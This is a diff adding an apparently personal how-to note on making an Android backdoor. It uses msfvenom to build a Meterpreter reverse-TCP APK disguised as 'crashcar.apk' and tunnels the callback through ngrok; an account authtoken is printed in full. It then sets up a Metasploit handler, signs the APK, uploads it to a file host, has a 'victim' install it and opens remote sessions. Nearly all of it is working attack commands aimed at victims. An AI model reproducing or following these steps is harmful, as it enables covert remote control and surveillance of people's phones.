@@ -1,0 +1,104 @@
+Create a android backdoor.
+
+1)msfvenom :  use this tool to create backdoors.
+
+#msfvenom -p windows(os for what backdoor is)
+			 meterpreter :  is a session mannager(create session with victim)
+			 reverse_tcp : way we use to hack into victim(connection from victim)
+			 LHOST : local host that we are going to expecting connection to come
+			 LPORT : port we are expecting connection to come
+			 
+			 
+>>>ngrock : To create a tunneling service between victim and hacker.
+			It will give you host and port which will again forward response to our local kali linux.
+			- It will allow us to connect our local service with internet			
+
+
+Go to the dir where ngrock is downloaded.
+1) to connect our account			
+$ ./ngrok authtoken 1cV8J6ujKWkl9nTN06WouJG15AO_4sEWmQtRgVSY1AQERGgRi 
+2) to open a port to ngrok to send info from internet to local.
+$ ./ngrok tcp 4242
+=======> Result :
+Session Status                online                                                          
+
+Account                       mehul vaddoriya (Plan: Free)                                    
+Version                       2.3.35                                                          
+Region                        United States (us)                                              
+Web Interface                 http://127.0.0.1:4040                                           
+Forwarding                    tcp://0.tcp.ngrok.io:11709 -> localhost:4242  
+
+Here our LHOST = 0tcp.ngrok.io  and LPORT=11709  it will send connection to localhost:4242 which is local kali machine.
+
+ 
+#msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=11709 R > /root/crashcar.apk
+
+Now your apk is ready at /root/ with name crashcar.apk
+
+2) listen incoming connection.
+
+$service postgresql start :  start db service to use msfconsole.
+$msfconsole : it will start metasploit console.
+
+msf5 >
+
+multihandler : Start multi handler using below command.
+
+msf5 > use exploit/multi/handler
+
+now set payload you used before.
+
+> set payload android/meterpreter/reverse_tcp
+> show options
+
+now set LHOST and LPORT of local kali and not ngrok
+
+> set LHOST 0.0.0.0
+> set LPORT 4242
+
+now verify it using show options command.
+
+We are ready to listen incomming connecitons.
+
+> exploit -j -z 
+
+3) signin the apk to run in android system.
+->  use below two command
+keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore ngroktest.apk alias_name
+
+
+-> user apk-signer app on android device.
+
+4) upload this file to file.fm
+5) install it to vincitm machine
+
+-> it will show connection when victim open this apk.
+
+to list sessions
+>sessions -l 
+
+>session -1 to use first connection
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
